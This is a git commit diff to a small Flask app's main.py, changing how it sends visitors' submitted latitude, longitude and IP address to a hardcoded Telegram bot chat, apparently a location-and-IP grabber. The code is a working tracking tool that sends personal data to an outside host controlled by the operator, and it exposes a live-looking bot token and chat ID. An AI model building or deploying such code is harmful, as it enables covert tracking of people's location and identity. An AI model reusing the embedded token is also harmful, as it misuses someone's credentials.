82a18f1d791f2dec99e9db12756a1c9b15206997
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-24 18:52:32 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,6 @@
 from flask import Flask, render_template, request
 import requests
-import threading
-
+#
 app = Flask(__name__)
 
 @app.route('/')
@@ -14,13 +13,6 @@ def send_location():
     longitude = request.form['longitude']
     ip_address = request.form['ip_address']
     
-    # Create a new thread to send the location and IP address to Telegram
-    telegram_thread = threading.Thread(target=send_telegram_message, args=(latitude, longitude, ip_address))
-    telegram_thread.start()
-    
-    return 'Location and IP sent successfully!'
-
-def send_telegram_message(latitude, longitude, ip_address):
     # Send the location and IP address to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
     chat_id = '373715044'
@@ -28,8 +20,11 @@ def send_telegram_message(latitude, longitude, ip_address):
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
     
     response = requests.get(api_url)
-    if response.status_code != 200:
-        print('Failed to send location and IP.')
+    if response.status_code == 200:
+        return 'Location and IP sent successfully!'
+    else:
+        return 'Failed to send location and IP.'
 
 if __name__ == '__main__':
     app.run()
+	
